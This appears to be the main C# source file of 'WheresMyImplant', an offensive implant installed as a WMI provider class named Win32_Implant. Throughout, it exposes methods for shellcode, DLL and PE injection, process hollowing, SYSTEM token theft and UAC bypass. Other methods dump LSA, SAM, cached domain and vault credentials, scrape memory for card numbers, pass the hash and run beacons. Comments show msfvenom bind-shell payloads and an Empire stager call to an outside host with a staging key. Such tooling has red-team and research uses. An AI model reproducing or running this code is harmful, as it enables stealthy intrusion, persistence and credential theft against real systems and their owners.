using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Configuration.Install;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Management.Instrumentation;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;


using System.Reflection;

[assembly: WmiConfiguration(@"root\cimv2", HostingModel = ManagementHostingModel.LocalSystem), AssemblyKeyFileAttribute("sgKey.snk")]
namespace WheresMyImplant
{

    [System.ComponentModel.RunInstaller(true)]
    public class MyInstall : DefaultManagementInstaller
    {
        public override void Install(IDictionary stateSaver)
        {
            try
            {
                new System.EnterpriseServices.Internal.Publish().GacInstall("WhereMyImplant.dll");
                base.Install(stateSaver);
                RegistrationServices registrationServices = new RegistrationServices();
            }
            catch (Exception error)
            {
                Console.WriteLine(error.ToString());
            }
        }

        public override void Uninstall(IDictionary savedState)
        {
            try
            {
                new System.EnterpriseServices.Internal.Publish().GacRemove("WhereMyImplant.dll");
                ManagementClass managementClass = new ManagementClass(@"root\cimv2:Win32_Implant");
                managementClass.Delete();
            }
            catch { }

            try
            {
                base.Uninstall(savedState);
            }
            catch (Exception error)
            {
                Console.WriteLine(error.ToString());
            }
        }
    }

    [ComVisible(true)]
    [ManagementEntity(Name = "Win32_Implant")]
    public class Implant
    {
        [ManagementTask]
        public static string RunCMD(string command, string parameters)
        {
            RunCommandPrompt runCommandPrompt = new RunCommandPrompt(command, parameters);
            return runCommandPrompt.GetOutput();
        }

        [ComVisible(true)]
        [ManagementTask]
        public static string RunPowerShell(string command)
        {
            RunPowerShell runPowerShell = new RunPowerShell(command);
            return runPowerShell.GetOutput();
        }
        
        [ManagementTask]
        public static string RunXpCmdShell(string server, string database, string username, string password, string command)
        {
            //Invoke-CimMethod -Class Win32_Implant -Name RunXpCmdShell -Argument @{command="whoami"; database=""; server="sqlserver"; username="sa"; password="password"}
            RunXPCmdShell runXPCmdShell = new RunXPCmdShell(server, database, username, password, command);
            return runXPCmdShell.GetOutput();
        }
        
        [ManagementTask]
        //msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
        //Invoke-CimMethod -Class Win32_Implant -Name InjectShellCode -Argument @{shellCodeString=$payload; processId=432}
        public static string InjectShellCode(string shellCodeString, String strProcessId)
        {
            Int32 dwProcessId = 0;
            if (String.IsNullOrEmpty(strProcessId))
            {
                using (InjectShellCode injectShellCode = new InjectShellCode(shellCodeString))
                {
                    injectShellCode.Execute();
                    return injectShellCode.GetOutput();
                }
            }
            else if (Int32.TryParse(strProcessId, out dwProcessId))
            {
                using (InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)dwProcessId))
                {
                    injectShellCodeRemote.Execute();
                    return injectShellCodeRemote.GetOutput();
                }
            }
            else
            {
                return "Invalid Process ID";
            }
        }

        [ManagementTask]
        public static string InjectShellCodeWMIFSB64(String wmiClass, String fileName, Int32 processId)
        {
            Byte[] peBytes = Misc.QueryWMIFS(wmiClass, fileName);
            String shellCodeString = System.Text.Encoding.Unicode.GetString(peBytes);

            InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)processId);
            return injectShellCodeRemote.GetOutput();
        }

        // Todo: Add Auto Token Privilege Elevation
        [ManagementTask]
        //http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread
        //msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll
        //Invoke-CimMethod -ClassName Win32_Implant -Name InjectDll -Arguments @{library = "C:\bind64.dll"; processId = 3372}
        public static String LoadDll(String library, String strProcessId)
        {
            Int32 dwProcessId = 0;
            if (String.IsNullOrEmpty(strProcessId))
            {
                LoadDll injectDll = new LoadDll(library);
                return injectDll.GetOutput();
            }
            else if (Int32.TryParse(strProcessId, out dwProcessId))
            {
                String output;
                using (LoadDllRemote injectDllRemote = new LoadDllRemote(library, (UInt32)dwProcessId))
                {
                    UInt32 size = 0;
                    Console.WriteLine(Misc.GetModuleAddress("kernel32.dll", (UInt32)dwProcessId, ref size));
                    injectDllRemote.Execute();
                    output = injectDllRemote.GetOutput();
                }
                return output;
            }
            else
            {
                return "Invalid Process ID";
            }
        }
       
        [ManagementTask]
        //Invoke-CimMethod -ClassName Win32_Implant -Name InjectPeFromFileRemote -Arguments @{processId=5648; fileName="C:\bind64.exe"; parameters=""}
        public static string InjectPeFile(Int32 processId, String fileName, String parameters)
        {
            using (PELoader peLoader = new PELoader())
            {
                peLoader.Execute(fileName);
                InjectPERemote injectPE = injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
                string output = "";

                try
                {
                    injectPE.execute();
                }
                catch
                {
                    output = "[-] Execution Failed\n";
                }
                finally
                {
                    output += injectPE.GetOutput();
                }
                return output;
            }
        }

        [ManagementTask]
        public static string InjectPeString(Int32 processId, String peString, String parameters)
        {
            string output = "";

            PELoader peLoader = new PELoader();
            peLoader.Execute(System.Convert.FromBase64String(peString));

            InjectPE injectPE = new InjectPE(peLoader, parameters);
            output += injectPE.GetOutput();
            return output;
        }

        [ManagementTask]
        public static string InjectPeWMIFS(Int32 processId, String wmiClass, String fileName, String parameters)
        {
            string output = "";

            Byte[] peBytes = Misc.QueryWMIFS(wmiClass, fileName);
            PELoader peLoader = new PELoader();
            peLoader.Execute(peBytes);

            InjectPERemote injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
            try
            {
               injectPE.execute();
            }
            catch
            {
               output = "[-] Execution Failed\n";
            }
            finally
            {
               output += injectPE.GetOutput();
            }
            return output;
        }

        [ManagementTask]
        public static string InjectPeWMIFSRemote(Int32 processId, string wmiClass, string system, string username, string password, string fileName, string parameters)
        {
            string output = "";

            ConnectionOptions options = new ConnectionOptions();

            options.Username = username;
            options.Password = password;

            ManagementScope scope = new ManagementScope("\\\\" + system + "\\root\\cimv2", options);
            scope.Connect();

            ObjectQuery queryIndexCount = new ObjectQuery("SELECT Index FROM WMIFS WHERE FileName = \'" + fileName + "\'");
            ManagementObjectSearcher searcherIndexCount = new ManagementObjectSearcher(scope, queryIndexCount);
            ManagementObjectCollection queryIndexCollection = searcherIndexCount.Get();
            int indexCount = queryIndexCollection.Count;

            String EncodedText = "";
            for (int i = 0; i < indexCount; i++)
            {
                ObjectQuery queryFilePart = new ObjectQuery("SELECT FileStore FROM WMIFS WHERE FileName = \'" + fileName + "\' AND Index = \'" + i + "\'");
                ManagementObjectSearcher searcherFilePart = new ManagementObjectSearcher(scope, queryFilePart);
                ManagementObjectCollection queryCollection = searcherFilePart.Get();
                foreach (ManagementObject filePart in queryCollection)
                {
                    EncodedText += filePart["FileStore"].ToString();
                }
            }

            byte[] peBytes = System.Convert.FromBase64String(EncodedText);
            PELoader peLoader = new PELoader();
            peLoader.Execute(peBytes);
            InjectPERemote injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
            try
            {
                injectPE.execute();
            }
            catch
            {
                output = "[-] Execution Failed\n";
            }
            finally
            {
                output += injectPE.GetOutput();
            }
            return output;
        }

        [ManagementTask]
        public static String HollowProcess(String target, String replacement)
        {
            HollowProcess hp = new HollowProcess();
            if (!hp.CreateSuspendedProcess(target))//@"C:\Windows\notepad.exe"))
            {
                return Misc.GetError();
            }

            if (!hp.ReadPEB())
            {
                return Misc.GetError();
            }

            if (!hp.GetTargetArch())
            {
                return Misc.GetError();
            }

            if (!hp.GetContext())
            {
                return Misc.GetError();
            }

            if (!hp.ReadNTHeaders())
            {
                return Misc.GetError();
            }

            if (!hp.ReadSourceImage(replacement))
            {
                return Misc.GetError();
            }

            if (!hp.RemapImage())
            {
                return Misc.GetError();
            }

            if (!hp.ResumeProcess64())
            {
                return Misc.GetError();
            }

            return "Process Hollowed";
        }
       
        [ManagementTask]
        //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "powershell","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
        //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "dotnet","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
        public static string Empire(string server, string stagingKey, string language)
        {
           EmpireStager empireStager = new EmpireStager(server, stagingKey, language);
           empireStager.execute();
           return empireStager.GetOutput();
        }

        [ManagementTask]
        public static String Tokenvator(string command)
        {
            Tokens tokenvator = new Tokens();
            if (command.ToLower().Contains("getsystem"))
            {
                String[] split = command.Split(' ');
                if (split.Length >= 2)
                {
                    tokenvator.GetSystem(split[1]);
                }
                else
                {
                    tokenvator = new Tokens();
                    tokenvator.GetSystem("cmd.exe");
                }
            }
            else if (command.ToLower().Contains("gettrustedinstaller"))
            {
                String[] split = command.Split(' ');
                if (split.Length >= 2)
                {
                    tokenvator.GetTrustedInstaller(split[1]);
                }
                else
                {
                    tokenvator.GetTrustedInstaller("cmd.exe");
                }
            }
            else if (command.ToLower().Contains("stealtoken"))
            {
                String[] split = command.Split(' ');
                if (split.Length >= 3)
                {
                    tokenvator.StartProcessAsUser(Int32.Parse(split[1]), split[2]);
                }
                else
                {
                    tokenvator.StartProcessAsUser(Int32.Parse(split[1]), "cmd.exe");
                }
            }
            else
            {
                tokenvator = new Tokens();
                tokenvator.GetHelp();
            }
            return tokenvator.GetOutput();
        }

        [ManagementTask]
        public static String BypassUac(string command)
        {
            RestrictedToken tokenvator = new RestrictedToken();
            String[] split = command.Split(' ');
            if (split.Length == 2)
            {
                tokenvator.BypassUAC(Int32.Parse(split[1]), split[2]);
            }
            else if (split.Length == 3)
            {
                tokenvator = new RestrictedToken();
                tokenvator.BypassUAC(Int32.Parse(split[1]), "cmd.exe");
            }
            else
            {
                tokenvator = new RestrictedToken();
                tokenvator.GetHelp();
            }
            return tokenvator.GetOutput();
        }

        [ManagementTask]
        public static String DumpLsa()
        {
            StringBuilder output = new StringBuilder();
            CheckPrivileges checkSystem = new CheckPrivileges();
            String results = "";
            if (checkSystem.GetSystem())
            {
                LSASecrets lsaSecrets = new LSASecrets();
                lsaSecrets.DumpLSASecrets();
                results = lsaSecrets.GetOutput();
            }
            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
            return output.ToString();
        }

        [ManagementTask]
        public static String DumpSAM()
        {
            StringBuilder output = new StringBuilder();
            CheckPrivileges checkSystem = new CheckPrivileges();
            String results = "";
            if(checkSystem.GetSystem())
            {
                SAM sam = new SAM();
                results = sam.GetOutput();
            }
            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
            return output.ToString();
        }

        [ManagementTask]
        public static String DumpDomainCache()
        {
            StringBuilder output = new StringBuilder();
            CheckPrivileges checkSystem = new CheckPrivileges();
            String results = "";
            if(checkSystem.GetSystem())
            {
                CacheDump cacheDump = new CacheDump();
                results = cacheDump.GetOutput();
            }
            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
            return output.ToString();
        }

        [ManagementTask]
        public static String DumpVault()
        {
            StringBuilder output = new StringBuilder();
            Vault vault = new Vault();
            vault.EnumerateCredentials();

            CheckPrivileges checkSystem = new CheckPrivileges();
            if (checkSystem.GetSystem())
            {
                vault = new Vault();
                vault.EnumerateCredentials();
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String DumpVaultCLI()
        {
            VaultCLI vault = new VaultCLI();
            vault.EnumerateVaults();
            return vault.GetOutput();
        }

        [ManagementTask]
        public static String DumpBrowserHistory()
        {
            BrowserHistory history = new BrowserHistory();
            history.InternetExplorer();
            history.Firefox();
            history.Chrome();
            return history.GetOutput();
        }

        [ManagementTask]
        public static String ReadProcessMemory(String processId)
        {
            StringBuilder output = new StringBuilder();
            Int32 pid;
            if (!Int32.TryParse(processId, out pid))
            {
                return output.ToString();
            }

            ReadProcessMemory readProcessMemory = new ReadProcessMemory(pid);
            if (!readProcessMemory.OpenProcess())
            {
                return output.ToString();
            }
            readProcessMemory.ReadProcesMemory();
            output.Append(readProcessMemory.GetOutput());
            output.Append("\n-----\n");
            output.Append(CheckCCNumber(readProcessMemory.GetPrintableMemory()));
            return output.ToString();
        }

        [ManagementTask]
        public static String CheckCCNumber(String input)
        {
            StringBuilder output = new StringBuilder();
            foreach (String number in CheckCreditCard.CheckString(input))
            {
                output.Append(number);
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String MiniDump(String processId, String fileName)
        {
            StringBuilder output = new StringBuilder();
            Int32 pid;
            if (!Int32.TryParse(processId, out pid))
            {
                return output.ToString();
            }

            MiniDumpWriteDump miniDump = new MiniDumpWriteDump();
            miniDump.CreateMiniDump((UInt32)pid, fileName);
            output.Append(miniDump.GetOutput());
            return output.ToString();
        }

        //FormalChicken
        public static void StartSmbServer(String pipeName)
        {
            Console.WriteLine("Starting SMB Server");
            while (true)
            {
                using (SMBServer smbServer = new SMBServer(pipeName))
                {
                    smbServer.WaitForConnection();
                    smbServer.MainLoop();
                }
            }
        }

        //GothTurkey
        public static void StartWebServiceServer(String serviceName, String port)
        {
            Console.WriteLine("Starting Web Service");
            WebService webService = new WebService(serviceName, port);
        }

        //DiscoChicken
        public static void StartWebServiceBeacon(String socket, String provider, String retries)
        {
            Int32 retriesCount;
            if (!Int32.TryParse(retries, out retriesCount))
            {
                retriesCount = 0;
            }

            using (WebServiceBeacon webServiceBeacon = new WebServiceBeacon(socket, provider))
            {
                Console.WriteLine("Starting Web Servic Beacon");
                webServiceBeacon.SetRetries(retriesCount);
                webServiceBeacon.Run();
            }
        }

        public static void PSExec(String system, String execute, String isCommand)
        {
            Boolean comspec;
            if (!Boolean.TryParse(isCommand, out comspec))
            {
                comspec = false;
            }

            using (PSExec psexec = new PSExec())
            {
                psexec.Connect(system);
                String command = execute;
                if (comspec)
                {
                    command = String.Format("%COMSPEC% /C start {0}", execute);
                }
                psexec.Create(command);
                psexec.Open();
                psexec.Start();
                psexec.Stop();
            }
        }

        /*
        //DiscoChicken
        public static void StartWebServiceBeacon(String socket, String provider)
        {
            using (WebServiceBeacon webServiceBeacon = new WebServiceBeacon(socket, provider))
            {
                Console.WriteLine("Starting Web Servic Beacon");
                webServiceBeacon.SetRetries(0);
                webServiceBeacon.Run();
            }
        }
        */

        [ManagementTask]
        public static String WirelessPreSharedKey()
        {
            StringBuilder output = new StringBuilder();
            WirelessProfiles wp = new WirelessProfiles();
            wp.GetProfiles();
            output.Append(wp.GetOutput());
            return output.ToString();
        }

        [ManagementTask]
        public static String PassTheHash(String target, String domain, String username, String hash)
        {
            String output;
            using (SMBClient smbClient = new SMBClient())
            {
                smbClient.Connect(target);
                smbClient.NegotiateSMB();
                smbClient.NegotiateSMB2();
                smbClient.NTLMSSPNegotiate();
                smbClient.Authenticate(domain, username, hash);
                smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, "c$"));
                smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "c$"));
                output = smbClient.GetOutput();
            }
            return output;
        }
    }
}